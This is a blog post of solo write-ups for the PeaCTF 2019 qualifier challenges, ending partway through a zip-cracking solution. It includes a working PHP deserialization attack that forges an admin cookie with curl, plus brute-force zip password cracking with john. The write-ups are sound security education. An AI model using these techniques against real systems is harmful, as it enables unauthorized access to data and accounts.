---
layout: post
title: 	"PeaCTF Qualifiers (13th Place): All Challenges"
date:	2019-07-28 12:00:00 +0000
categories: writeups peactf
---

<div class="toc-container">
  <ul id="markdown-toc">
    <li><a href="#breakfast" id="markdown-toc-h1-header">Breakfast</a>
    <ul>
        <li><a href="#challenge" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#broken-keyboard" id="markdown-toc-h1-header">Broken Keyboard</a>
    <ul>
        <li><a href="#challenge-1" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-1" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#worth" id="markdown-toc-h1-header">Worth</a>
    <ul>
        <li><a href="#challenge-2" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-2" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#hide-and-seek" id="markdown-toc-h1-header">Hide and Seek</a>
    <ul>
        <li><a href="#challenge-3" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-3" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#school" id="markdown-toc-h1-header">School</a>
    <ul>
        <li><a href="#challenge-4" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-4" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#choose-your-pokemon" id="markdown-toc-h1-header">Choose your Pokemon</a>
    <ul>
        <li><a href="#challenge-5" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-5" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#coffee-time" id="markdown-toc-h1-header">Coffee Time</a>
    <ul>
        <li><a href="#challenge-6" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-6" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#we-are-extr" id="markdown-toc-h1-header">We are E.xtr</a>
    <ul>
        <li><a href="#challenge-7" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-7" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#crack-the-key" id="markdown-toc-h1-header">Crack the Key</a>
    <ul>
        <li><a href="#challenge-8" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-8" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#rsa" id="markdown-toc-h1-header">RSA</a>
    <ul>
        <li><a href="#challenge-9" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-9" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#educated-guess" id="markdown-toc-h1-header">Educated Guess</a>
    <ul>
        <li><a href="#challenge-10" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-10" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#the-wonderful-wizard" id="markdown-toc-h1-header">The Wonderful Wizard</a>
    <ul>
        <li><a href="#challenge-11" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-11" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#song-of-my-people" id="markdown-toc-h1-header">Song of My People</a>
    <ul>
        <li><a href="#challenge-12" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-12" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
    <li><a href="#philips-and-over" id="markdown-toc-h1-header">Philips And Over</a>
    <ul>
        <li><a href="#challenge-13" id="markdown-toc-h3-header">Challenge</a></li>
  	  	<li><a href="#solution-13" id="markdown-toc-h3-header">Solution</a></li>
    </ul>
    </li>
  </ul>
</div>

PeaCTF ran from the 22nd of July until the 28th of July. The following are my writeups for all the challenges. I participated solo and managed to achieve 13th place out of about 500 teams.

A quick note before we begin: If you intend on following each writeup, make sure you do the challenges yourself. Different accounts get different "instances" of the challenges and will therefore have different flags.

# Breakfast
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Cryptography
* **Points:** 50

### Challenge

>Mmm I ate some nice **bacon** and eggs this morning. Find out what else I had for
an easy flag. Don’t forget to capitalize CTF! [Ciphertext](https://shell1.2019.peactf.com/static/fa2ff378dd2e1361fcf19cdf92e5d6f0/enc.txt)

### Solution

We get a file 'enc.txt'. Let's see what it says.
```shell
» cat enc.txt
011100010000000000101001000101{00100001100011010100000000010100101010100010010001}
```

I first notice that the length of the binary string on the left side of the '{' is 30 bytes. Since that's not divisible by four, I know it won't just be a simple binary to ascii conversion (and testing that out proves that hypothesis).

The challenge description has 'bacon' in bold, so my first thought was to try [Bacon's Cipher](https://en.wikipedia.org/wiki/Bacon%27s_cipher). I didn't bother writing a script for this, I just split the binary string into groups of 5 bytes, then used the table in the wikipedia page linked above to get the flag.

Flag: `peaCTF{eggwaffles}`

# Broken Keyboard
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Cryptography
* **Points:** 50

### Challenge

>Help! My keyboard only types numbers! [Ciphertext](https://shell1.2019.peactf.com/static/a993b6d91714b32556129ca0167b97ed/enc.txt)

### Solution

We get a file 'enc.txt'. Let's see what it says.
```shell
» cat enc.txt
112 101 97 67 84 70 123 52 115 99 49 49 105 115 99 48 48 108 125
```

Looks just like ascii values.
```shell
» python
Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> a = "112 101 97 67 84 70 123 52 115 99 49 49 105 115 99 48 48 108 125"
>>> a = a.split(" ")
>>> flag = ""
>>> for c in a:
...     flag += chr(int(c))
... 
>>> flag
'peaCTF{4sc11isc00l}'
>>> 
```

Flag: `peaCTF{4sc11isc00l}`

# Worth
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** General Skills
* **Points:** 50

### Challenge

>This problem is worth 0o670 points. 
>
>Hints: Put your answer in the flag format: flag{peactf_}

### Solution

0o670 is octal 670. We change it to decimal.
```shell
» python
Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> int("670", 8)
440
>>> 

```

Flag: `flag{peactf_440}`

# Hide and Seek
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** General Skills
* **Points:** 100

### Challenge
>Try to find to the flag file located somewhere in the folders located in: /problems/hide-and-seek_25_0e640bba38cc92e6d15b31356b8da948
>
>Hints: Some tools get handy when files get disorganized. What does the command "find" do?

### Solution

This challenge is meant to be done on the shell server that they provide. The output below is very confusing to read, but basically, there's a bunch of folders in the problem directory with md5 hashes as their names. I just ran `grep -r "flag"` to do a recursive search in all files for the string "flag" and found the flag.

```shell
redacted@peactf-2019-shell-1:~$ cd /problems/hide-and-seek_25_0e640bba38cc92e6d15b31356b8da948 
redacted@peactf-2019-shell-1:/problems/hide-and-seek_25_0e640bba38cc92e6d15b31356b8da948$ ls
0d25b16b914709741369b819945b0bf0  729f8ea0d5411ba9ace8ab81b85dfeeb  c7aedbdcaf676f8d2c09442e52cfafaa
1669f36b1ac7090bd856260ce43218a5  78d34b9d02d92171a474ec1da4bcb00e  c7ea4c7f95347f4df35db14baf36a7b3
1d605b2d651f64d92b08806e81ed628e  80c61a18ebf26a9879459c019d3f7c53  ce1dd5c46ece18fe24e7831bcc3ec30c
214e77f3ad89cf3b51a6a1e57dbdf71d  842396f0947cb3045687b38d2146ac0b  d0cbef8bb144f0a6d4f16b40b412335a
268e3d17d577477026a55082f273a527  8905c0803e929825858959e836851aa3  d52829411065f6931fa4607ba9eb4227
292d47481cc793624f415b3fc9f52e4c  8d10a1205abdfd74664b79c4d326eb13  d5a2c0077680ed77f9af29a18d0da759
2a59a8dd4f83938fbe9111aab59843ee  8d5b3cc0a20b8be88b717f6c83a7b965  d6b47a0cd038e4fdb8d656f674100a87
3e6ed491b34f304154bed7d7171636df  956e5db22d81f3af003639deeb59d15d  dbf9e3bc723987bd4acab05c7b280466
4bce56b4a176bf50f04b7a80d30217df  9ce326bc264c115a1508342c5f9a52b7  e1a5401230004091da71f0117fb2dc72
50d8794afb17c96491bbe9e18b2a57d9  a4f7099a716fdd218ba2ff758ff0f2d6  e4c6d0ac2b3625b06deb9da1d62b79f8
53636240136d7dab43189177b32a2eb5  a755b25ac7374bd637cf50674c96eda9  ea36acd172c9113dd6af4ec079c225da
536f25f87904314d67cd7d8609367aad  a94c683eaa581ca96f3fc9aa3bd71745  ef16c11436d3172eb20af75eeaf73e3c
581d1a983deb7c64f295c5b9c0208dd5  b92024daf712d6c59a8be81086cd3762  f0ca4adbc0fec022f72bae2e7be2643d
5b7a6b80095d0a33bcd76df8ec9b8b83  bc901a79cc34dbbc04908905a6e7a04a  f2067e099c9081dda0adfc2ec079b6ed
669ad7956d87d857b16f870e9a2cac88  bf5f5250b2ff1ad512d71d776761ce36  f2985a210aecc06ae0992292d7030669
6d8283aae25d1f48cd08a0e71c9e6fb7  c276bddb69f0e6546ae2ff489cdfbaf9  fbec866af69d37e4b0eed978347ec10f
7153a0a051f591b7cd54cac433c4ca2c  c525832a0b2cf142569e9206e907c2e2

redacted@peactf-2019-shell-1:/problems/hide-and-seek_25_0e640bba38cc92e6d15b31356b8da948$ grep -r "peaCTF"
redacted@peactf-2019-shell-1:/problems/hide-and-seek_25_0e640bba38cc92e6d15b31356b8da948$ grep -r "flag"
6d8283aae25d1f48cd08a0e71c9e6fb7/62c213fe3df128148aab4613a639f423/e090b6868d74a6255d763d6660d8117e/435d968d9d03
d21df3a2cf50f1bae280/e28de84641381790a1aad0ea7b532da1/5aff2f46968759edf769a6c2dbd0ce6f/c8572610a56e9afece38b304
610649ed/73c633c0ef2b0e2b3dad75752c8ae5a1/eead523c9655f13983275e77eaee48ae/1a05ff8f68e5c5da8339224209d1ae2e/d7c
4cb734c81223435648f1281e6deec/57ddca46fa4b3261bcc698ffa118e86d/af839d876aea0f0e5876b2bbea370f41/3f6be00884efeec
5d9b7c1b0f49fa533/c4a88c081884012f1ab6b9a41fbee8ad/bfe0dc1a7d0280af6192d7dd5d423bf7/7decc2b55d454de7d822f5840a5
b19b7/ac85917d5adae905367a3b2f82e2d148/e8a193af8b23e08e506cc0a93a067265/5ef7122e5df6d550cbc00b5ac54d0de0/flag.t
xt:flag{peactf_linux_is_fun_bb6f529aa108b7d7021c00833742fe7a}
redacted@peactf-2019-shell-1:/problems/hide-and-seek_25_0e640bba38cc92e6d15b31356b8da948$ 
```

Flag: `flag{peactf_linux_is_fun_bb6f529aa108b7d7021c00833742fe7a}`

# School
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Cryptography
* **Points:** 100

### Challenge

>My regular teacher was out sick so we had a **substitute** today. [Ciphertext](https://shell1.2019.peactf.com/static/6999a90c2dc921d2e0de4720df921549/enc.txt)

### Solution

Looking at the enc.txt file given.
```shell
» cat enc.txt
Alphabet: ​WCGPSUHRAQYKFDLZOJNXMVEBTI
zswGXU{ljwdhsqmags}
```
Challenge description has "substitute" in bold and the enc.txt file gives us an alphabet. Looks like a simple substitution cipher. I wrote a script for it.
```python
alphabet = "WCGPSUHRAQYKFDLZOJNXMVEBTI".lower()
cipher = "zswGXU{ljwdhsqmags}".lower()
plaintext = ""

for c in cipher:
    if c in alphabet:
        plaintext += chr(alphabet.find(c) + ord('a'))
    else:
        plaintext += c

print plaintext # prints 'peactf{orangejuice}'
```

We have to make sure to capitalize the 'ctf' in 'peactf' since I called `lower()` on both given strings to make the script simpler.

Flag: `peaCTF{orangejuice}`

# Choose your Pokemon
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Forensics
* **Points:** 150

### Challenge

>Just a simple type of recursive function. [master-ball](https://shell1.2019.peactf.com/static/65bd33064cdedf978b43938c55bec25e/master-ball)
>
>Hints: Flag is formatted as {plain_text}

### Solution

We run file against the master-ball file, see its RAR archive. Unrar it, see the next file is a zip archive. Unzip that, get a PDF file.

```shell
» file master-ball
master-ball: RAR archive data, v5
-----------------------------------------------------------------------------------
» unrar x master-ball

UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal


Extracting from master-ball

Extracting  roshambo                                                  OK 
All OK
-----------------------------------------------------------------------------------
» file roshambo
roshambo: Zip archive data, at least v2.0 to extract
-----------------------------------------------------------------------------------
» unzip roshambo
Archive:  roshambo
  inflating: inDesign                
-----------------------------------------------------------------------------------
» file inDesign
inDesign: PDF document, version 1.7
```

Opening the PDF file gives us a link to [https://pastebin.com/AWTDEb9j](https://pastebin.com/AWTDEb9j). I copied all the data from there into a file and ran file against it. I guessed that it would be rtf beforehand since the very first line starts with `{\rtf1\adeflang1025`.
```shell
» file flag.rtf
flag.rtf: Rich Text Format data, version 1, unknown character set
```

I used unrtf to convert the rtf file to normal text.
```shell
» unrtf --text flag.rtf
###  Translation from RTF performed by UnRTF, version 0.21.10 
### font table contains 101 fonts total
### creation date: 20 July 2019 22:34 
### revision date: 20 July 2019 22:42 
### total pages: 1
### total words: 1
### total chars: 11

-----------------
{wild_type}
```

Flag: `{wild_type}`

# Coffee Time
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Reversing
* **Points:** 250

### Challenge

>Run this jar executable in a virtual machine and see what happens. [coffeetime.jar](https://shell1.2019.peactf.com/static/662472b783ec7377576e23f6c795dadc/coffeetime.jar)

### Solution

We get given a jar file. The challenge category is Reversing, so we know we have to decompile the file. I use jd-gui to do this.
```java
package coffeetime;

import java.io.IOException;
import java.math.BigInteger;
import java.util.Random;
import org.jline.reader.LineReader;
import org.jline.reader.LineReaderBuilder;
import org.jline.terminal.TerminalBuilder;



public class CoffeeTime
{
  public static void main(String[] args) throws Exception { new CoffeeTime(); }

  
  public CoffeeTime() throws IOException, InterruptedException {
    LineReader lineReader = LineReaderBuilder.builder().terminal(TerminalBuilder.terminal()).build();
    String line = lineReader.readLine("Can you give me some time to calculate a number? [y/n]\n");
    if (line.equals("y")) {
      Random random = new Random();
      BigInteger bigInteger = new BigInteger(2000, random);
      long timestart = System.currentTimeMillis();
      BigInteger result = bigInteger.pow(10000);
      long timeend = System.currentTimeMillis();
      int secs = (int)((timeend - timestart) / 5.0D);
      System.out.println("\nWhat is " + bigInteger + " to the power of 10000?");
      System.out.println("You have " + (secs / 1000.0D) + " seconds to answer.");
      Thread.sleep(secs);
      line = lineReader.readLine();
      System.out.println("\nPlease wait.");
      if (line.equals(result.toString())) {
        if (System.currentTimeMillis() > timeend + secs) {
          System.out.println("Uh-oh, time's out.");
        } else {
          System.out.println("peaCTF{nice_cup_of_coffee}");
        } 
      } else {
        System.out.println("Wrong answer, unfortunately.");
      } 
    } 
  }
}
```

We can see the flag hardcoded into the code.

Flag: `peaCTF{nice_cup_of_coffee}`

# We are E.xtr
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Forensics
* **Points:** 350

### Challenge

>[E.xtr](https://shell1.2019.peactf.com/static/0c54269f754b99bd071f40f8d5cbf1aa/E.xtr)
>
>Hints: Flag is formatted as {plain_text}

### Solution

We are given this weird file with a .xtr extension. Google doesn't give us much. Running `file` against it tells us its just data.
```shell
» file E.xtr
E.xtr: data
```

Using xxd, I checked the first few bytes of the file.
```shell
» xxd E.xtr
00000000: 8958 5452 0d0a 1a0a 0000 000d 4948 4452  .XTR........IHDR
00000010: 0000 0500 0000 02d0 0803 0000 018f a41d  ................
00000020: f200 0000 0173 5247 4200 aece 1ce9 0000  .....sRGB.......
00000030: 0004 6741 4d41 0000 b18f 0bfc 6105 0000  ..gAMA......a...
00000040: 0066 504c 5445 ffff ffdf dfdf 7f7f 7f40  .fPLTE.........@
00000050: 4040 2828 2800 0000 1818 1850 5050 f7f7  @@(((......PPP..
00000060: f7af afaf 9797 9710 1010 6868 68e7 e7e7  ..........hhh...
00000070: 2020 2078 7878 9f9f 9f08 0808 bfbf bf8f     xxx..........
00000080: 8f8f c7c7 c7a7 a7a7 7070 7030 3030 6060  ........ppp000``
00000090: 60cf cfcf b7b7 b758 5858 3838 38ef efef  `......XXX888...
000000a0: d7d7 d748 4848 8787 8700 0000 4dab 042e  ...HHH......M...
000000b0: 0000 0022 7452 4e53 ffff ffff ffff ffff  ..."tRNS........
000000c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000d0: ffff ffff ffff ffff ff00 0dd0 c371 0000  .............q..
000000e0: 0009 7048 5973 0000 0ec3 0000 0ec3 01c7  ..pHYs..........
```

I know my file formats, and that looks an awful lot like PNG to me. I opened the file up in vim and just changed the 'XTR' to 'PNG' and opening up the file in an image viewer, we have the following.

![E.png](/images/peactf/E.png){:height="250px" width="300px"}

Flag: `{read_banned_it}`

# Crack the Key
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Cryptography
* **Points:** 450

### Challenge

>On one of my frequent walks through the woods, I stumbled upon this old French scroll with the title "le chiffre indéchiffrable." Remember to submit as peaCTF{plaintext_key}. [Ciphertext](https://shell1.2019.peactf.com/static/a4836f4c3f6a10f05c2383a4486bd934/enc.txt)
>
>Hints: The text is guaranteed to be in modern English with regular letter frequencies.

### Solution

Looking at the given ciphertext.
```shell
» cat enc.txt 
DVMDVRWOUISIERRRGNNVMWPOPGTOHSBUIHTCSSMJIVUWEXHTCTKZKFXIENWTDDOVMEOWDZRQEBQPVLFWKJBGL
EEDALGCIVLQGLTWTCMFXSIAQTLTUGZQZZWOPVGIRCSLRUZRJUZBQSXSPXGJMGTPRPUGRSIVRGUDAFXHTNLVVBMF
ZMQSFUWTWTFSWHIGXHTQLGCUSRGLEIWWXXWWCJDAIFXGAPDWGWFHTZSVOBISITRVUTTVRTWTDGMCPHGGNRDB
POIZZWZPGHTTDQPHOYIUTUEWJDCPWORWDAZREDNHYSJZRJPAFSOCPDXZVPLVPGMNIWPFWUVRDUJINIDFXLYIUTE
NWAHITVJZRJPVQEFAJEXWIMQVIYPTWGZYYYXKTNNVMQJTPVZRJHEBVDWPOKGEIUDCAHDJGTRYKLHSILXHPIZPVDE
MDZGLEEGTDWDMGSTRAHXIPFGRVKPLUEDPHEVSEKHSZREMDCELWGVHKQBYSCXRLLRRGLQFLESIZGGDQXCQPETT
XEXGKLHDBUIRPCTQSCWLIPNHBTTYEYIIHSBUETIWPCKYSXALNPLBTPXAEXKTJVKBPGYEKJSRCIFQRYDYIKNEVHISILN
DFXGWXKTENCOASXEBFVVDPRAAHPWASPWFPTYIDIWZYYYXKTVNQEJCOIJNLLRPUIHPSMIWEIAWQOMTTSHEKNMOAQ
AKDDCMISLXBLIFWOWXRLDPVHVIEHESDYXZVJDGUGLAITGIJPSQTENWQJXEIJVEGNBBPOHTLRZFYUHAYIEEXYSJUIUI
WUIAGLSELYIKPLGSSPNLXGEIHCLBJTWTMMYSEUCWAESDGESXIELHMQTLPIQSJDQDYWEAAHPWVWRHBTVFGOCRPH
GELLHJRHOUHEVSNYQSMEELPCEIJEAKXKULUCVQVGDEETIZLELPDXOVPYTGRERHDWHSEHKPLYETTAJKJFAQGIGLEG
HESMKFXIPRAAHHEMDCEPPRRWTXRWSGBMQVXVKWXISEOZWHPVQFECTGSDVRWPXCIAGPYGWZRVEQGIOUISIXRG
WIPNXHXHEYKYIVWIQREKTCFWVRFJBOIFDGPPGEKWWMBXHTGLRADEOHJRKACIZEJIMYTIAHMPZPXZVQVTTIISRDXJGI
XDQTREFITCXZVMUSQSJEGTYXXRWKXWAWFXGDXURQHIPRXHGTPHGXWEACRFEAAUIKJMHPVQTICRSIJRRGIPRRTWT
AMYJAKDARXTATOHGNRLCBUISIGLAADQHSQNXEANTRXISQIWSXHTEWELWSUBBUIHTCDTWIGKTLGLEBHPPNVWRCBU
IWXCOSOJMOAAGLEEXRIGEWIACGXEGTOYHKSWWMEEFITCWLYIVWMRTACSNSOJPDNLBANQTSMFUXKTXVKSPCOFW
XEQIWPLELISIULHWWMGAORPCXZFVVTAOSXTGLRVTPRKMEGABTTRLFKHIPRVWPAVMFXZHGGFPOLAJEFUWHIBVRGS
DHRLYILGDNWTWPTVQYSRUAJMTWVCISKGDGMYISIISIJVWKDCYHBTHZQWJQDATNRIBPWGGEGHPTRHICISIKKVDLKYS
VTGHEKRWWDCGQOIWPVDPQDGMNTPGDLGZZRJBQQHLTATJWNLRWIQREKTCUMZXHVWGLEGUTKMIIEPKXEFITCLWIJ
RJZGLFDPWFGOIULIFENTCZVEFYVQMNWTCTLVDPILVPGIECWLRVJLLVPNRDPHDXJFRJPANRYILZSJUMQPZLLOGHPWH
LXWDORXHTGLAZZXHHBEMPTSZAFYMVCWFIGPKPLADEVDURAHPIDXMGMGPXCIAGPYGWRRGXVSECIWPASJRRIWSJI
GHEVSKILCBRPLXVPRUVFXIPRAAHJYMNVVVPTYCRTHAIUKIGUWELIHHEISUMQTAFSFRWLVSTXHGIAHTGTXIFUSXHXBA
EGHZJOFVNPNGIRIWPLGIWHHKNQEBJCMWCXKTEUMTTVZELRRGQMANABXYXZVHRCSRCBTCUEEZRZPAGLEDAOIKKE
QXUNPOCISIXRVPPVQXHTLZVKKXHBXRVESWPWWCHRBBNPKTSLRVNLHCPRHISXEASJYVJIYPYIDXECVWRBMPCNXRL
PJVQDGSSSRXCDXSEGHWMJSUASDEQKLDIOBHHPSRMNVRKXUNXAXAESCVISIPRJLXTDSXWFXIBUETWTHSMCHVDWA
IRWPGIZRHQDBNMLPCORGWPLTANPOCTLQGEKWWMNRIBPWWGEXKTNNVMWTYINVVOPCTLESXQEKBIGLPLLELDFPVJ
EBIPNXHTHLAFFXKXVTXOAPFKZRXQTDRVTWTWIKJALIPBYTDEPRDPEGBQGXICVTXZVADHLRZOITOXGSSATZGLEILZSX
KLHBCFYAAAJWHVRWIPRMRHJYHSPWWDORXHTGTRLYIVBIYPPPSOSUBFHNWAHTWTZVUYEUSOEEZXCRWAUIENAVH
EPCORWMIUHXREKXCR
```

I just used [this website](https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx) to get the key. You can always write your own tool to break this. The way I figured out it was a Vigenere cipher was partly trial and error, and partly the french in the challenge description.

From the website, we get the following output.
```
Based on repetitions in the encrypted text, the most probable key length is 39 characters.

Here is a list of the most probable keys based on frequency analysis of the letters in the cipher:

Key #1: redpineapplesredpineapplesredpineatples
Key #2: redpineapplesredpineapplesredpineatpleg
...
...
```

So I just guessed the key was "redpineapples"

Flag: `peaCTF{redpineapples}`

# RSA
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Cryptography
* **Points:** 500

### Challenge

>Can you help Bob retrieve the two messages for a flag? [Authenticated Channel](https://shell1.2019.peactf.com/static/894df24fe1495bddd441cad98558f7dc/auth_channel.txt) [Encrypted Channel](https://shell1.2019.peactf.com/static/894df24fe1495bddd441cad98558f7dc/enc_channel.txt)
>
>Hints: Convert decimal to hex. Flag is in the format of peaCTF{plaintext_key}

### Solution

Typical RSA challenge. We get given two files.
```shell
» cat auth_channel.txt   
Authenticated (unhashed) channel:
n = 59883006898206291499785811163190956754007806709157091648869
e = 65537
c = 23731413167627600089782741107678182917228038671345300608183
----------------------------------------------------------------------------------
» cat enc_channel.txt  
Encrypted channel:
n = 165481207658568424313022356820498512502867488746572300093793
e = 65537
c = 150635433712900935381157860417761227624682377134647578768653
```

If you already know how RSA authentication works, you may skip the next couple paragraphs. If you are unfamiliar with RSA in general, I suggest [this link](https://en.wikipedia.org/wiki/RSA_(cryptosystem)).

In RSA, if Person A wants to send a message to Person B, then Person A encrypts the message with Person B's public key. Person B then decrypts the message with their private key. However, with this method, there is no way for Person B to verify that it was indeed Person A that sent them the message.

The way authentication works, Person A will ***hash*** the entire message that they want to send, then encrypt that hash with their own (Person A's) private key. They will send this encrypted hash along with the message (encrypted with Person B's public key) to Person B. Person B can decrypt the message with their own private key. They can then decrypt the hash with Person A's **public** key (since RSA is an asymmetric cipher). They can then hash the message themselves and compare the two hashes. If they match, then Person B knows for a fact that the message came from Person A, since only Person A has access to Person A's private key.

Now knowing all of that, we are told that the auth channel in this challenge is unhashed. We already have all the information required to decrypt the auth message since we just need to use the public key to decrypt it (which we already have). The script I used is the following.
```python
n = 59883006898206291499785811163190956754007806709157091648869
e = 65537
c = 23731413167627600089782741107678182917228038671345300608183
m = pow(c, e, n)
m_hex = hex(m)[2:-1]

print m_hex.decode('hex') # outputs '1ng1sfun}''
```

That gives us the second half of the flag. In order to get the first half, we have to decrypt the actual message sent in the enc message. If you are completely unfamiliar with how the RSA cryptosystem works, I suggest you read the wikipedia page linked above. I used [factordb](http://factordb.com) to check if n was able to be factorized, and it turns out it is. I then wrote a simple script to calculate the private key and decrypt the message.
```python
from Crypto.Util.number import inverse

p = 404796306518120759733507156677
q = 408801179738927870766525808109
phi = (p-1)*(q-1)
e = 65537
n = p*q
d = inverse(e, phi)
c = 150635433712900935381157860417761227624682377134647578768653
m = pow(c, d, n)
m_hex = hex(m)[2:-1]

print m_hex.decode('hex') # outputs 'peaCTF{f4ct0r'
```

Combining the outputs, we get the flag.

Flag: `peaCTF{f4ct0r1ng1sfun}`

# Educated Guess
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Web Exploitation
* **Points:** 600

### Challenge

>There is a secured system running at [http://shell1.2019.peactf.com:1428/query.php](http://shell1.2019.peactf.com:1428/query.php). You have obtained the [source code](https://shell1.2019.peactf.com/static/112f0c66294260681ad5008f0b775684/query.phps). 
>
>Hints: Good programmers follow naming conventions.

### Solution

We are given a website link as well as the query.php file that the website apparently uses. The code is as follows.
```php
<!doctype html>
<html>
<head>
    <title>Secured System</title>
</head>
<body>
<?php

// https://www.php-fig.org/psr/psr-4/

function autoload($class)
{
    include $class . '.class.php';
}

spl_autoload_register('autoload');

if (!empty($_COOKIE['user'])) {
    $user = unserialize($_COOKIE['user']);

    if ($user->is_admin()) {
        echo file_get_contents('../flag');
    } else {
        http_response_code(403);
        echo "Permission Denied";
    }
} else {
    echo "Not logged in.";
}
?>
</body>
</html>
```

It takes a cookie named 'user', first makes sure it's not empty, the unserializes it, calls `$user->is_admin()` and gives us the flag only if it returns true. This tells me that the cookie is actually an object that is serialized and stored as the cookie (in its 'value' field). 

I used [writephponline](http://www.writephponline.com/) to write my own class for this object. I had to make an 'educated guess' on how the `is_admin()` function worked as well as what the class field was called. My first guess of $admin turned out working. The hint of the challenge also helps a lot.
```php
class User
{
    public $admin = true; //the real class doesnt set it to true by default, but we want it to be true

    public function is_admin() 
    {
        return $admin;
    }
}

$a = new User();
echo serialize($a);

# Output = 'O:4:"User":1:{s:5:"admin";b:1;}'
```

Then I url encoded output from above and used curl. Curl wouldn't work without at least url encoding or escaping out the quotes and colons from the above output.
```shell
» curl --cookie "user=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22admin%22%3Bb%3A1%3B%7D" http://shell1.2019.peactf.com:1428/query.php
<!doctype html>
<html>
<head>
    <title>Secured System</title>
</head>
<body>
flag{peactf_follow_conventions_4022940cb27774f618aa62fe8be202bc}</body>
</html>
```

Flag: `flag{peactf_follow_conventions_4022940cb27774f618aa62fe8be202bc}`

# The Wonderful Wizard
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Forensics
* **Points:** 750

### Challenge

>[TheWonderfulWizard.png](https://shell1.2019.peactf.com/static/90b725a83adb3db9ef2c64d9820374de/TheWonderfulWizard.png)

### Solution

We are given an image. First thing I always do is run stegsolve on images. I let stegsolve analyse it and then started scrolling through each of the different planes. Blue Plane 3 gave me this image.

![blue_plane_3](/images/peactf/blue_plane_3.png){:height="250px"}

I used python to decode the hex.
```shell
» python
Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> a = "666c61677b706561637466"
>>> a += "5f77686572655f7468655f"
>>> a += "77696e645f626c6f77737d"
>>> print a.decode('hex')
flag{peactf_where_the_wind_blows}
>>> 
```

Flag: `flag{peactf_where_the_wind_blows}`

# Song of My People
<a href="{{ page.url }}#title">Back to top ↑</a>

* **Category:** Forensics
* **Points:** 800

### Challenge

>A specific soundcloud rapper needs help getting into his password protected zipped file directory. The initial password is in the title. You just have to know your memes, and pick the right instrument! We were on the fence on giving you an image to go along with this puzzle, but the loincloth was too scandalous. Alternatively, you could bruteforce. [Song of My People](https://shell1.2019.peactf.com/static/3fd6b2e03e0d3585c1b3d3fa19bfce87/song_of_my_people.zip)
>
>Hints: Flag is formatted as {plain_text}

### Solution

We are given a zip file that is password protected. I just chose to brute force the password using john.
```shell
» zip2john song_of_my_people.zip > song.hash
ver 2.0 efh 9901 song_of_my_people.zip/Ice Cube - Check Yo Self Remix (Clean).mp3 PKZIP Encr: cmplen=5550839, decmplen=5601208, crc=3F7D5D
ver 2.0 efh 9901 song_of_my_people.zip/README.txt PKZIP Encr: cmplen=132, decmplen=123, crc=E3A5855B
ver 2.0 efh 9901 song_of_my_people.zip/a lengthy issue.png PKZIP Encr: cmplen=42909, decmplen=44525, crc=6514CE68
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
----------------------------------------------------------------------------------------------------------------------------------------------
» john --wordlist=~/tools/wordlists/rockyou.txt song.hash
Warning: detected hash type "ZIP", but the string is also recognized as "ZIP-opencl"
Use the "--format=ZIP-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
violin           (song_of_my_people.zip/Ice Cube - Check Yo Self Remix (Clean).mp3)
